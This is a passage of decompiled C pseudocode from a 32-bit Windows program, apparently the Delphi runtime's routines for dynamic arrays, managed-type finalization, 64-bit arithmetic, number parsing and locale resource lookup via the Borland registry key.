          LOBYTE(a1) = sub_404C1C(*(_DWORD *)&a2[v9 + 6], **(_DWORD **)&a2[v9 + 10]);
          v8 = v5-- <= 1;
        }
        while ( !v8 );
        break;
      case 0xE:
        v10 = v6;
        do
        {
          v3 = (_DWORD *)((char *)v3 + *(_DWORD *)&a2[v10 + 2]);
          LOBYTE(a1) = sub_404BEC(v7, a2);
          v8 = v5-- <= 1;
        }
        while ( !v8 );
        break;
      case 0xF:
      case 0x11:
        goto LABEL_10;
      default:
        sub_4027E8(2, 0);
    }
  }
  return (char)a1;
}
// 404CA2: variable 'v7' is possibly undefined
// 404BEC: using guessed type int __fastcall sub_404BEC(_DWORD, _DWORD);

//----- (00404CB0) --------------------------------------------------------
int __usercall sub_404CB0@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v2; // ecx
  int v4; // esi
  int v5; // edi
  bool v6; // zf
  bool v7; // sf
  bool v8; // of

  v2 = *(unsigned __int8 *)(a2 + 1);
  v4 = v2 + a2 + 10;
  v5 = *(_DWORD *)(v2 + a2 + 6);
  do
  {
    sub_404CE4((int *)(a1 + *(_DWORD *)(v4 + 4)), **(char ***)v4, 1);
    v4 += 8;
    v8 = __OFSUB__(v5, 1);
    v6 = v5 == 1;
    v7 = --v5 < 0;
  }
  while ( !(v7 ^ v8 | v6) );
  return a1;
}

//----- (00404CE4) --------------------------------------------------------
int *__usercall sub_404CE4@<eax>(int *result@<eax>, char *a2@<edx>, int a3@<ecx>)
{
  int *v3; // ebx
  int v5; // edi
  char v6; // al
  int v7; // edx
  bool v8; // cc
  int v9; // ebp
  int v10; // ebp
  int *v11; // eax
  int *v12; // eax
  int *v13; // [esp-4h] [ebp-4h]

  if ( a3 )
  {
    v13 = result;
    v3 = result;
    v5 = a3;
    v6 = *a2;
    v7 = (unsigned __int8)a2[1];
    switch ( v6 )
    {
      case 10:
        if ( a3 > 1 )
          sub_404290((int)v3, a3);
        else
          sub_40426C(v3);
        break;
      case 11:
        if ( a3 > 1 )
          sub_404918((OLECHAR **)v3, a3);
        else
          sub_404900((OLECHAR **)v3);
        break;
      case 12:
        do
        {
          v3 += 4;
          sub_405160();
          v8 = v5-- <= 1;
        }
        while ( !v8 );
        break;
      case 13:
        v9 = v7;
        do
        {
          v3 = (int *)((char *)v3 + *(_DWORD *)&a2[v9 + 2]);
          sub_404CE4(*(_DWORD *)&a2[v9 + 6], **(_DWORD **)&a2[v9 + 10]);
          v8 = v5-- <= 1;
        }
        while ( !v8 );
        break;
      case 14:
        v10 = v7;
        do
        {
          v3 = (int *)((char *)v3 + *(_DWORD *)&a2[v10 + 2]);
          sub_404CB0();
          v8 = v5-- <= 1;
        }
        while ( !v8 );
        break;
      case 15:
        do
        {
          v11 = v3++;
          sub_405F40(v11);
          v8 = v5-- <= 1;
        }
        while ( !v8 );
        break;
      case 17:
        do
        {
          v12 = v3++;
          sub_405868(v12, (int)a2);
          v8 = v5-- <= 1;
        }
        while ( !v8 );
        break;
      default:
        sub_4027E8(2, (void *)a3);
    }
    return v13;
  }
  return result;
}
// 404CB0: using guessed type int sub_404CB0(void);

//----- (00404DD0) --------------------------------------------------------
int *__usercall sub_404DD0@<eax>(int *a1@<eax>, char *a2@<edx>)
{
  return sub_404CE4(a1, a2, 1);
}

//----- (00404DDC) --------------------------------------------------------
int __usercall sub_404DDC@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v5; // edi
  int v6; // ebp
  int result; // eax
  int v8; // ecx
  bool v9; // cc
  void *v10; // ecx
  int v11; // eax
  _BYTE *v12; // edx
  int v13; // eax
  int v14; // ecx
  int v15; // [esp-8h] [ebp-18h]
  int v16; // [esp-8h] [ebp-18h]
  int v17; // [esp-4h] [ebp-14h]

  v5 = *(unsigned __int8 *)(a3 + 1) + a3 + 10;
  v6 = *(_DWORD *)(*(unsigned __int8 *)(a3 + 1) + a3 + 6);
  result = 0;
  v17 = *(_DWORD *)(*(unsigned __int8 *)(a3 + 1) + a3 + 2);
  do
  {
    v8 = *(_DWORD *)(v5 + 4);
    v9 = v8 <= result;
    v10 = (void *)(v8 - result);
    if ( !v9 )
      sub_402844((char *)(a2 + result), (char *)(a1 + result), (int)v10);
    v11 = *(_DWORD *)(v5 + 4);
    v12 = **(_BYTE ***)v5;
    LOBYTE(v10) = *v12;
    if ( *v12 == 10 )
    {
      sub_4042C0((volatile __int32 *)(a1 + v11), *(_DWORD *)(v11 + a2));
      v13 = 4;
    }
    else
    {
      switch ( (_BYTE)v10 )
      {
        case 0xB:
          sub_40493C((OLECHAR **)(a1 + v11), *(const OLECHAR **)(v11 + a2));
          v13 = 4;
          break;
        case 0xC:
          sub_4050B0(v10, v11 + a2);
          v13 = 16;
          break;
        case 0xD:
          v14 = (unsigned __int8)v12[1];
          v15 = *(_DWORD *)&v12[v14 + 2];
          sub_404EF8(*(_DWORD *)&v12[v14 + 6]);
          v13 = v15;
          break;
        case 0xE:
          sub_404DDC(v12, v11 + a2, *(_DWORD *)&v12[(unsigned __int8)v12[1] + 2]);
          v13 = v16;
          break;
        case 0xF:
          sub_405F58((_DWORD *)(a1 + v11), *(_DWORD *)(v11 + a2));
          v13 = 4;
          break;
        case 0x11:
          sub_4058A4((int *)(a1 + v11), *(_DWORD *)(v11 + a2), **(_DWORD **)v5);
          v13 = 4;
          break;
        default:
          sub_4027E8(2, v10);
      }
    }
    result = *(_DWORD *)(v5 + 4) + v13;
    v5 += 8;
    --v6;
  }
  while ( v6 );
  if ( v17 > result )
    return sub_402844((char *)(a2 + result), (char *)(result + a1), v17 - result);
  return result;
}
// 404E42: variable 'v10' is possibly undefined
// 404EB0: variable 'v16' is possibly undefined
// 404EF8: using guessed type _DWORD __stdcall sub_404EF8(_DWORD);
// 4050B0: using guessed type int __fastcall sub_4050B0(_DWORD, _DWORD);

//----- (00404EF8) --------------------------------------------------------
int __userpurge sub_404EF8@<eax>(volatile __int32 *a1@<eax>, __int32 *a2@<edx>, _BYTE *a3@<ecx>, int a4)
{
  int v6; // edi
  int result; // eax
  _DWORD *v9; // edi

  v6 = (int)a3;
  LOBYTE(a3) = *a3;
  switch ( (_BYTE)a3 )
  {
    case 0xA:
      do
      {
        result = (int)sub_4042C0(a1++, *a2++);
        --a4;
      }
      while ( a4 );
      break;
    case 0xB:
      do
      {
        result = (int)sub_40493C((OLECHAR **)a1++, (const OLECHAR *)*a2++);
        --a4;
      }
      while ( a4 );
      break;
    case 0xC:
      do
      {
        result = sub_4050B0(a3, a2);
        a1 += 4;
        a2 += 4;
        --a4;
      }
      while ( a4 );
      break;
    case 0xD:
      v9 = (_DWORD *)(*(unsigned __int8 *)(v6 + 1) + v6 + 2);
      do
      {
        result = sub_404EF8(v9[1]);
        a1 = (volatile __int32 *)((char *)a1 + *v9);
        a2 = (__int32 *)((char *)a2 + *v9);
        --a4;
      }
      while ( a4 );
      break;
    case 0xE:
      do
      {
        sub_404DDC((int)a1, (int)a2, v6);
        result = *(unsigned __int8 *)(v6 + 1);
        a1 = (volatile __int32 *)((char *)a1 + *(_DWORD *)(result + v6 + 2));
        a2 = (__int32 *)((char *)a2 + *(_DWORD *)(result + v6 + 2));
        --a4;
      }
      while ( a4 );
      break;
    case 0xF:
      do
      {
        result = (int)sub_405F58(a1++, *a2++);
        --a4;
      }
      while ( a4 );
      break;
    case 0x11:
      do
      {
        result = (int)sub_4058A4((int *)a1++, *a2++, v6);
        --a4;
      }
      while ( a4 );
      break;
    default:
      JUMPOUT(0x4027E8);
  }
  return result;
}
// 404F39: control flows out of bounds to 4027E8
// 404F6D: variable 'a3' is possibly undefined
// 4050B0: using guessed type int __fastcall sub_4050B0(_DWORD, _DWORD);

//----- (00404FEC) --------------------------------------------------------
_DWORD *__usercall sub_404FEC@<eax>(const WCHAR *a1@<eax>, int a2@<edx>, char **a3@<ecx>)
{
  return sub_4043C0(a2, a3, a1);
}

//----- (00404FF8) --------------------------------------------------------
_DWORD *__usercall sub_404FF8@<eax>(const WCHAR *a1@<eax>, char **a2@<edx>)
{
  int v4; // eax

  v4 = sub_404A6C((int)a1);
  return sub_404FEC(a1, v4, a2);
}

//----- (0040501C) --------------------------------------------------------
int __usercall sub_40501C@<eax>(const CHAR *a1@<eax>)
{
  int v2; // eax
  int v4; // [esp+0h] [ebp-8h] BYREF

  v4 = 0;
  v2 = sub_404524((int)a1);
  sub_404960(v2, &v4, a1);
  return v4;
}

//----- (00405040) --------------------------------------------------------
void __thiscall __noreturn sub_405040(void *this)
{
  sub_4027E8(16, this);
}

//----- (00405048) --------------------------------------------------------
__int16 __usercall sub_405048@<ax>(unsigned __int16 *a1@<eax>, void *a2@<ecx>)
{
  unsigned __int16 v2; // ax
  bool v3; // cf
  __int16 result; // ax

  v2 = *a1;
  v3 = v2 < 2u;
  result = v2 - 2;
  if ( !v3 )
  {
    result -= 8;
    if ( result )
      sub_405040(a2);
  }
  return result;
}

//----- (00405060) --------------------------------------------------------
__int16 (__usercall *sub_405060())@<ax>(unsigned __int16 *a1@<eax>, void *a2@<ecx>)
{
  int i; // eax
  __int16 (__usercall *result)@<ax>(unsigned __int16 *@<eax>, void *@<ecx>); // eax

  for ( i = 0; i != 43; ++i )
    dword_42C658[i] = (int)sub_405040;
  result = sub_405048;
  dword_42C658[0] = (int)sub_405048;
  return result;
}
// 42C658: using guessed type int dword_42C658[];

//----- (00405080) --------------------------------------------------------
int *__usercall sub_405080@<eax>(int *result@<eax>)
{
  qmemcpy(result, &dword_42C658, 0xACu);
  return result;
}
// 42C658: using guessed type int dword_42C658;

//----- (00405094) --------------------------------------------------------
const void *__usercall sub_405094@<eax>(const void *result@<eax>)
{
  qmemcpy(&dword_42C658, result, 0xACu);
  return result;
}
// 42C658: using guessed type int dword_42C658;

//----- (00405108) --------------------------------------------------------
int __stdcall sub_405108(int a1, int a2)
{
  return dword_42C69C(a1, a2);
}
// 42C69C: using guessed type int (__stdcall *dword_42C69C)(_DWORD, _DWORD);

//----- (00405154) --------------------------------------------------------
int sub_405154()
{
  return dword_42C6DC(14);
}
// 42C6DC: using guessed type int (__thiscall *dword_42C6DC)(_DWORD);

//----- (00405160) --------------------------------------------------------
void __spoils<edx,ecx> sub_405160()
{
  sub_4050A8();
}
// 4050A8: using guessed type int sub_4050A8(void);

//----- (00405168) --------------------------------------------------------
void __thiscall __noreturn sub_405168(void *this)
{
  sub_4027E8(17, this);
}

//----- (00405170) --------------------------------------------------------
int __userpurge sub_405170@<eax>(int a1@<eax>, int a2, int a3)
{
  return a2 * a1;
}

//----- (00405194) --------------------------------------------------------
int __userpurge sub_405194@<eax>(__int64 _RAX@<edx:eax>, unsigned int a2, int a3)
{
  char v3; // di
  unsigned int v4; // ebx
  int v5; // ecx
  unsigned int v6; // ebp
  int v7; // ecx
  char v11; // [esp-4h] [ebp-14h]

  v3 = 0;
  v4 = a2;
  v5 = a3;
  if ( a3 || HIDWORD(_RAX) && a2 )
  {
    if ( _RAX < 0 )
    {
      _RAX = -_RAX;
      v3 = 1;
    }
    if ( a3 < 0 )
    {
      v4 = -a2;
      v5 = -a3 - (a2 != 0);
      v3 ^= 1u;
    }
    v6 = v5;
    v7 = 64;
    v11 = v3;
    _EDI = 0;
    _ESI = 0;
    do
    {
      LODWORD(_RAX) = 2 * _RAX;
      __asm
      {
        rcl     edx, 1
        rcl     esi, 1
        rcl     edi, 1
      }
      if ( _EDI >= v6 && (_EDI > v6 || _ESI >= v4) )
      {
        _EDI = (__PAIR64__(_EDI, _ESI) - __PAIR64__(v6, v4)) >> 32;
        _ESI -= v4;
        LODWORD(_RAX) = _RAX + 1;
      }
      --v7;
    }
    while ( v7 );
    if ( (v11 & 1) != 0 )
      return -_RAX;
  }
  else
  {
    LODWORD(_RAX) = _RAX / (unsigned __int64)a2;
  }
  return _RAX;
}

//----- (00405210) --------------------------------------------------------
int __userpurge sub_405210@<eax>(unsigned __int64 _RAX@<edx:eax>, unsigned __int64 a2)
{
  int v2; // ecx

  if ( HIDWORD(a2) || HIDWORD(_RAX) && (_DWORD)a2 )
  {
    v2 = 64;
    _EDI = 0;
    _ESI = 0;
    do
    {
      LODWORD(_RAX) = 2 * _RAX;
      __asm
      {
        rcl     edx, 1
        rcl     esi, 1
        rcl     edi, 1
      }
      if ( __PAIR64__(_EDI, _ESI) >= a2 )
      {
        _EDI = (__PAIR64__(_EDI, _ESI) - a2) >> 32;
        _ESI -= a2;
        LODWORD(_RAX) = _RAX + 1;
      }
      --v2;
    }
    while ( v2 );
  }
  else
  {
    LODWORD(_RAX) = _RAX / (unsigned int)a2;
  }
  return _RAX;
}

//----- (0040525C) --------------------------------------------------------
int __userpurge sub_40525C@<eax>(__int64 _RAX@<edx:eax>, unsigned int a2, int a3)
{
  char v3; // di
  unsigned int v4; // ebx
  int v5; // ecx
  unsigned int v6; // ebp
  int v7; // ecx
  int result; // eax
  char v11; // [esp-4h] [ebp-14h]

  v3 = 0;
  v4 = a2;
  v5 = a3;
  if ( !a3 && (!HIDWORD(_RAX) || !a2) )
    return _RAX % (unsigned __int64)a2;
  if ( _RAX < 0 )
  {
    _RAX = -_RAX;
    v3 = 1;
  }
  if ( a3 < 0 )
  {
    v4 = -a2;
    v5 = -a3 - (a2 != 0);
  }
  v6 = v5;
  v7 = 64;
  v11 = v3;
  _EDI = 0;
  _ESI = 0;
  do
  {
    LODWORD(_RAX) = 2 * _RAX;
    __asm
    {
      rcl     edx, 1
      rcl     esi, 1
      rcl     edi, 1
    }
    if ( _EDI >= v6 && (_EDI > v6 || _ESI >= v4) )
    {
      _EDI = (__PAIR64__(_EDI, _ESI) - __PAIR64__(v6, v4)) >> 32;
      _ESI -= v4;
      LODWORD(_RAX) = _RAX + 1;
    }
    --v7;
  }
  while ( v7 );
  result = _ESI;
  if ( (v11 & 1) != 0 )
    return -_ESI;
  return result;
}

//----- (004052D8) --------------------------------------------------------
unsigned int __userpurge sub_4052D8@<eax>(unsigned __int64 _RAX@<edx:eax>, unsigned __int64 a2)
{
  int v2; // ecx

  if ( !HIDWORD(a2) && (!HIDWORD(_RAX) || !(_DWORD)a2) )
    return _RAX % (unsigned int)a2;
  v2 = 64;
  _EDI = 0;
  _ESI = 0;
  do
  {
    LODWORD(_RAX) = 2 * _RAX;
    __asm
    {
      rcl     edx, 1
      rcl     esi, 1
      rcl     edi, 1
    }
    if ( __PAIR64__(_EDI, _ESI) >= a2 )
    {
      _EDI = (__PAIR64__(_EDI, _ESI) - a2) >> 32;
      _ESI -= a2;
      LODWORD(_RAX) = _RAX + 1;
    }
    --v2;
  }
  while ( v2 );
  return _ESI;
}

//----- (00405328) --------------------------------------------------------
int __usercall sub_405328@<eax>(__int64 a1@<edx:eax>, char a2@<cl>)
{
  __int64 v2; // rax

  if ( a2 < 32 )
    return a1 << (a2 & 0x1F);
  else
    LODWORD(v2) = 0;
  return v2;
}

//----- (00405348) --------------------------------------------------------
int __usercall sub_405348@<eax>(unsigned __int64 a1@<edx:eax>, char a2@<cl>)
{
  if ( a2 < 32 )
  {
    a1 >>= a2 & 0x1F;
  }
  else if ( a2 < 64 )
  {
    LODWORD(a1) = HIDWORD(a1) >> a2;
  }
  else
  {
    LODWORD(a1) = 0;
  }
  return a1;
}

//----- (00405368) --------------------------------------------------------
__int64 __usercall sub_405368@<edx:eax>(int a1@<eax>, int *a2@<edx>)
{
  int v3; // ebp
  char v4; // al
  char v5; // bl
  unsigned __int8 v6; // al
  int v7; // edi
  unsigned __int8 v8; // al
  int v9; // edi
  __int64 v10; // rax
  char v11; // al
  __int64 v14; // [esp+10h] [ebp-1Ch]
  char v15; // [esp+18h] [ebp-14h]

  v3 = 1;
  v14 = 0i64;
  if ( a1 )
  {
    while ( *(_BYTE *)(a1 + v3 - 1) == 32 )
      ++v3;
    v15 = 0;
    v4 = *(_BYTE *)(a1 + v3 - 1);
    if ( v4 == 45 )
    {
      v15 = 1;
      ++v3;
    }
    else if ( v4 == 43 )
    {
      ++v3;
    }
    v5 = 1;
    if ( *(_BYTE *)(a1 + v3 - 1) == 36 || *(_BYTE *)(a1 + v3 - 1) == 48 && sub_402A30(*(_BYTE *)(a1 + v3)) == 88 )
    {
      if ( *(_BYTE *)(a1 + v3 - 1) == 48 )
        ++v3;
      ++v3;
      while ( 1 )
      {
        v6 = *(_BYTE *)(a1 + v3 - 1);
        if ( (unsigned __int8)(v6 - 48) < 0xAu )
        {
          v7 = v6 - 48;
        }
        else if ( (unsigned __int8)(v6 - 65) < 6u )
        {
          v7 = v6 - 55;
        }
        else
        {
          if ( (unsigned __int8)(v6 - 97) >= 6u )
            break;
          v7 = v6 - 87;
        }
        if ( HIDWORD(v14) > 0x7FFFFFF )
          break;
        v14 = v7 + 16 * v14;
        ++v3;
        v5 = 0;
      }
      if ( v15 )
        v14 = -v14;
    }
    else
    {
      while ( 1 )
      {
        v8 = *(_BYTE *)(a1 + v3 - 1);
        if ( (unsigned __int8)(v8 - 48) >= 0xAu )
          break;
        v9 = v8 - 48;
        if ( v14 < 0 || v14 > 0xCCCCCCCCCCCCCCCi64 )
          break;
        LODWORD(v10) = sub_405170(v14, 10, 0);
        v14 = v10 + v9;
        ++v3;
        v5 = 0;
      }
      if ( v15 )
        v14 = -v14;
      if ( v14 )
      {
        v11 = HIDWORD(v14) && v14 < 0;
        if ( v11 != v15 )
          --v3;
      }
    }
    if ( (*(_BYTE *)(a1 + v3 - 1) != 0) | (unsigned __int8)v5 )
      *a2 = v3;
    else
      *a2 = 0;
  }
  else
  {
    *a2 = 1;
  }
  return v14;
}
// 40550C: variable 'v10' is possibly undefined

//----- (0040558C) --------------------------------------------------------
int __usercall sub_40558C@<eax>(int result@<eax>)
{
  if ( result )
    return *(_DWORD *)(result - 4);
  return result;
}

//----- (00405594) --------------------------------------------------------
int __usercall sub_405594@<eax>(int a1@<eax>)
{
  return sub_40558C(a1) - 1;
}

//----- (0040559C) --------------------------------------------------------
int __userpurge sub_40559C@<eax>(volatile __int32 *a1@<eax>, __int32 *a2@<edx>, _BYTE *a3@<ecx>, int a4)
{
  return sub_404EF8(a1, a2, a3, a4);
}

//----- (004055B4) --------------------------------------------------------
// attributes: thunk
int *__usercall sub_4055B4@<eax>(int *a1@<eax>, int a2@<edx>)
{
  return sub_405868(a1, a2);
}

//----- (004055BC) --------------------------------------------------------
int *__userpurge sub_4055BC@<eax>(int *a1@<eax>, int a2@<edx>, void *a3@<ecx>, int *a4)
{
  int *v4; // ebx
  int v5; // edi
  int *result; // eax
  int *v7; // ebx
  int v8; // eax
  char **v9; // edx
  char *v10; // esi
  int v11; // ebx
  int *v12; // ebx
  int v13; // ebx
  int v14; // edi
  int v15; // edi
  int *v16; // [esp+Ch] [ebp-20h] BYREF
  int v17; // [esp+10h] [ebp-1Ch]
  int v18; // [esp+14h] [ebp-18h]
  int v19; // [esp+18h] [ebp-14h]
  int v20; // [esp+1Ch] [ebp-10h]
  int v21; // [esp+20h] [ebp-Ch]
  int v22; // [esp+24h] [ebp-8h]
  int *v23; // [esp+28h] [ebp-4h]
  _DWORD *v24; // [esp+34h] [ebp+8h]

  v22 = (int)a3;
  v23 = a1;
  v4 = (int *)*a1;
  v5 = *a4;
  if ( *a4 > 0 )
  {
    v20 = 0;
    if ( v4 )
    {
      v7 = v4 - 1;
      v20 = *v7;
      v4 = v7 - 1;
    }
    v8 = *(unsigned __int8 *)(a2 + 1) + a2;
    v18 = *(_DWORD *)(v8 + 2);
    v9 = *(char ***)(v8 + 6);
    if ( v9 )
      v10 = *v9;
    else
      v10 = 0;
    v17 = v18 * v5;
    if ( v18 * v5 / v5 != v18 )
      sub_4027E8(4, a3);
    v17 += 8;
    if ( v4 && *v4 != 1 )
    {
      --*v4;
      v11 = sub_4026E0(v17);
      v19 = v20;
      if ( v5 < v20 )
        v19 = v5;
      if ( v10 )
      {
        sub_402E48((char *)(v11 + 8), v18 * v19, 0);
        sub_40559C((volatile __int32 *)(v11 + 8), (__int32 *)*v23, v10, v19);
      }
      else
      {
        sub_402844((char *)*v23, (char *)(v11 + 8), v18 * v19);
      }
    }
    else
    {
      v16 = v4;
      if ( v5 < v20 && v10 )
        sub_4055AC((int *)((char *)v4 + v18 * v5 + 8), v10, v20 - v5);
      sub_402720(&v16, v17);
      v11 = (int)v16;
    }
    *(_DWORD *)v11 = 1;
    v12 = (int *)(v11 + 4);
    *v12 = v5;
    v13 = (int)(v12 + 1);
    sub_402E48((char *)(v13 + v20 * v18), v18 * (v5 - v20), 0);
    if ( v22 > 1 )
    {
      v24 = a4 + 1;
      --v22;
      v14 = v5 - 1;
      if ( v14 >= 0 )
      {
        v15 = v14 + 1;
        v21 = 0;
        do
        {
          sub_4055BC(v24);
          ++v21;
          --v15;
        }
        while ( v15 );
      }
    }
    result = v23;
    *v23 = v13;
  }
  else
  {
    if ( v5 < 0 )
      sub_4027E8(4, a3);
    return sub_4055B4(v23, a2);
  }
  return result;
}

//----- (00405748) --------------------------------------------------------
int *__usercall sub_405748@<eax>(int *a1@<eax>, int a2@<edx>, void *a3@<ecx>, int a4)
{
  return sub_4055BC(a1, a2, a3, &a4);
}

//----- (00405754) --------------------------------------------------------
int *__usercall sub_405754@<eax>(int a1@<eax>, int a2@<edx>, int *a3@<ecx>)
{
  if ( a1 )
    return sub_405774(a1, a2, 0, a3, *(_DWORD *)(a1 - 4));
  else
    return sub_405868(a3, a2);
}

//----- (00405774) --------------------------------------------------------
int *__userpurge sub_405774@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int *a4, int a5)
{
  int v5; // edi
  int v6; // esi
  volatile __int32 *v7; // ebx
  int v8; // eax
  _BYTE **v9; // eax
  int v10; // eax
  int *result; // eax
  int v12; // [esp+Ch] [ebp-10h]
  _BYTE *v13; // [esp+Ch] [ebp-10h]
  int v14; // [esp+10h] [ebp-Ch]
  __int32 *v17; // [esp+18h] [ebp-4h]

  v5 = a3;
  v6 = a5;
  v7 = 0;
  if ( a1 )
  {
    if ( a3 < 0 )
    {
      v6 = a3 + a5;
      v5 = 0;
    }
    v8 = *(_DWORD *)(a1 - 4);
    if ( v8 < v5 )
      v5 = *(_DWORD *)(a1 - 4);
    if ( v6 > v8 - v5 )
      v6 = v8 - v5;
    if ( v6 < 0 )
      v6 = 0;
    if ( v6 > 0 )
    {
      v12 = *(unsigned __int8 *)(a2 + 1) + a2;
      v14 = *(_DWORD *)(v12 + 2);
      v9 = *(_BYTE ***)(v12 + 6);
      if ( v9 )
        v13 = *v9;
      else
        v13 = 0;
      v10 = sub_4026E0(v14 * v6 + 8);
      *(_DWORD *)v10 = 1;
      *(_DWORD *)(v10 + 4) = v6;
      v7 = (volatile __int32 *)(v10 + 8);
      v17 = (__int32 *)(v14 * v5 + a1);
      if ( v13 )
      {
        sub_402E48((char *)(v10 + 8), v14 * v6, 0);
        sub_40559C(v7, v17, v13, v6);
      }
      else
      {
        sub_402844((char *)v17, (char *)(v10 + 8), v14 * v6);
      }
    }
  }
  sub_4055B4(a4, a2);
  result = a4;
  *a4 = (int)v7;
  return result;
}
// 405817: conditional instruction was optimized away because esi.4>=1

//----- (00405868) --------------------------------------------------------
int *__usercall sub_405868@<eax>(int *result@<eax>, int a2@<edx>)
{
  int v2; // ecx
  int v3; // eax
  _DWORD *v4; // edx
  int v5; // ecx
  int *v6; // [esp-4h] [ebp-4h]

  v2 = *result;
  if ( *result )
  {
    *result = 0;
    if ( !_InterlockedDecrement((volatile signed __int32 *)(v2 - 8)) )
    {
      v6 = result;
      v3 = v2;
      v4 = *(_DWORD **)(*(unsigned __int8 *)(a2 + 1) + a2 + 6);
      if ( v4 )
      {
        v5 = *(_DWORD *)(v2 - 4);
        if ( v5 )
          v3 = sub_404CE4(v5, *v4);
      }
      sub_402700(v3 - 8);
      return v6;
    }
  }
  return result;
}
// 404CE4: using guessed type int __fastcall sub_404CE4(_DWORD, _DWORD);

//----- (004058A4) --------------------------------------------------------
int *__usercall sub_4058A4@<eax>(int *result@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v3; // ebx
  int v4; // [esp-8h] [ebp-Ch]
  int *v5; // [esp-4h] [ebp-8h]

  v3 = *result;
  if ( a2 )
    _InterlockedIncrement((volatile signed __int32 *)(a2 - 8));
  if ( v3 && !_InterlockedDecrement((volatile signed __int32 *)(v3 - 8)) )
  {
    v5 = result;
    v4 = a2;
    ++*(_DWORD *)(v3 - 8);
    sub_405868(result, a3);
    a2 = v4;
    result = v5;
  }
  *result = a2;
  return result;
}

//----- (004058CC) --------------------------------------------------------
PVOID __usercall sub_4058CC@<eax>(const void *a1@<eax>)
{
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+0h] [ebp-1Ch] BYREF

  VirtualQuery(a1, &Buffer, 0x1Cu);
  if ( Buffer.State == 4096 )
    return Buffer.AllocationBase;
  else
    return 0;
}

//----- (004058F4) --------------------------------------------------------
int __usercall sub_4058F4@<eax>(int a1@<eax>)
{
  HMODULE v2; // eax
  CHAR Filename[272]; // [esp+0h] [ebp-110h] BYREF

  if ( !*(_DWORD *)(a1 + 16) )
  {
    GetModuleFileNameA(*(HMODULE *)(a1 + 4), Filename, 0x105u);
    v2 = sub_405B30(Filename);
    *(_DWORD *)(a1 + 16) = v2;
    if ( !v2 )
      *(_DWORD *)(a1 + 16) = *(_DWORD *)(a1 + 4);
  }
  return *(_DWORD *)(a1 + 16);
}

//----- (0040593C) --------------------------------------------------------
int __usercall sub_40593C@<eax>(int result@<eax>)
{
  _DWORD *v1; // edx

  v1 = (_DWORD *)dword_42B024;
  if ( dword_42B024 )
  {
    while ( result != v1[1] && result != v1[2] && result != v1[3] )
    {
      v1 = (_DWORD *)*v1;
      if ( !v1 )
        return result;
    }
    return sub_4058F4((int)v1);
  }
  return result;
}
// 42B024: using guessed type int dword_42B024;

//----- (00405964) --------------------------------------------------------
const CHAR *__usercall sub_405964@<eax>(const CHAR *result@<eax>)
{
  while ( *result && *result != 92 )
    result = CharNextA(result);
  return result;
}

//----- (00405978) --------------------------------------------------------
int __usercall sub_405978@<eax>(CHAR *a1@<eax>, int a2@<edx>)
{
  HMODULE ModuleHandleA; // eax
  DWORD (__stdcall *GetLongPathNameA)(LPCSTR, LPSTR, DWORD); // ebx
  const CHAR *v4; // eax
  const CHAR *v5; // esi
  int v6; // ebx
  const CHAR *v7; // edi
  HANDLE FirstFileA; // eax
  CHAR String2[261]; // [esp+Dh] [ebp-24Fh] BYREF
  char FindFileData[322]; // [esp+112h] [ebp-14Ah] BYREF
  int iMaxLength; // [esp+254h] [ebp-8h]
  LPSTR lpString1; // [esp+258h] [ebp-4h]

  iMaxLength = a2;
  lpString1 = a1;
  *(_DWORD *)&FindFileData[318] = a1;
  ModuleHandleA = GetModuleHandleA("kernel32.dll");
  if ( ModuleHandleA )
  {
    GetLongPathNameA = (DWORD (__stdcall *)(LPCSTR, LPSTR, DWORD))GetProcAddress(ModuleHandleA, "GetLongPathNameA");
    if ( GetLongPathNameA )
    {
      if ( GetLongPathNameA(lpString1, String2, 261) )
      {
LABEL_16:
        lstrcpynA(lpString1, String2, iMaxLength);
        return *(_DWORD *)&FindFileData[318];
      }
    }
  }
  if ( *lpString1 != 92 )
  {
    v5 = lpString1 + 2;
    goto LABEL_10;
  }
  if ( lpString1[1] == 92 )
  {
    v4 = sub_405964(lpString1 + 2);
    if ( *v4 )
    {
      v5 = sub_405964(v4 + 1);
      if ( *v5 )
      {
LABEL_10:
        v6 = v5 - lpString1;
        lstrcpynA(String2, lpString1, v5 - lpString1 + 1);
        while ( *v5 )
        {
          v7 = sub_405964(v5 + 1);
          if ( v6 + v7 - v5 + 1 > 261 )
            return *(_DWORD *)&FindFileData[318];
          lstrcpynA(&String2[v6], v5, v7 - v5 + 1);
          FirstFileA = FindFirstFileA(String2, (LPWIN32_FIND_DATAA)FindFileData);
          if ( FirstFileA == (HANDLE)-1 )
            return *(_DWORD *)&FindFileData[318];
          FindClose(FirstFileA);
          if ( v6 + 1 + lstrlenA(&FindFileData[44]) + 1 > 261 )
            return *(_DWORD *)&FindFileData[318];
          String2[v6] = 92;
          lstrcpynA(&String2[v6 + 1], &FindFileData[44], 261 - v6 - 1);
          v6 += lstrlenA(&FindFileData[44]) + 1;
          v5 = v7;
        }
        goto LABEL_16;
      }
    }
  }
  return *(_DWORD *)&FindFileData[318];
}
// 405978: using guessed type CHAR String2[261];

//----- (00405B30) --------------------------------------------------------
HMODULE __usercall sub_405B30@<eax>(const CHAR *a1@<eax>)
{
  LCID ThreadLocale; // eax
  HMODULE Library; // esi
  CHAR *i; // ebx
  CHAR *v4; // ebx
  unsigned int ExceptionList; // [esp-Ch] [ebp-134h] BYREF
  LPSTR v7; // [esp-8h] [ebp-130h]
  int v8; // [esp-4h] [ebp-12Ch]
  CHAR Filename[261]; // [esp+Bh] [ebp-11Dh] BYREF
  DWORD cbData; // [esp+110h] [ebp-18h] BYREF
  BYTE Data[5]; // [esp+116h] [ebp-12h] BYREF
  CHAR LCData[5]; // [esp+11Bh] [ebp-Dh] BYREF
  HKEY phkResult; // [esp+120h] [ebp-8h] BYREF
  LPCSTR lpString2; // [esp+124h] [ebp-4h]
  int savedregs; // [esp+128h] [ebp+0h] BYREF

  lpString2 = a1;
  GetModuleFileNameA(0, Filename, 0x105u);
  Data[0] = 0;
  if ( !RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Borland\\Locales", 0, 0xF0019u, &phkResult)
    || !RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Borland\\Locales", 0, 0xF0019u, &phkResult)
    || !RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Borland\\Delphi\\Locales", 0, 0xF0019u, &phkResult) )
  {
    v8 = (int)&savedregs;
    v7 = (LPSTR)&loc_405C35;
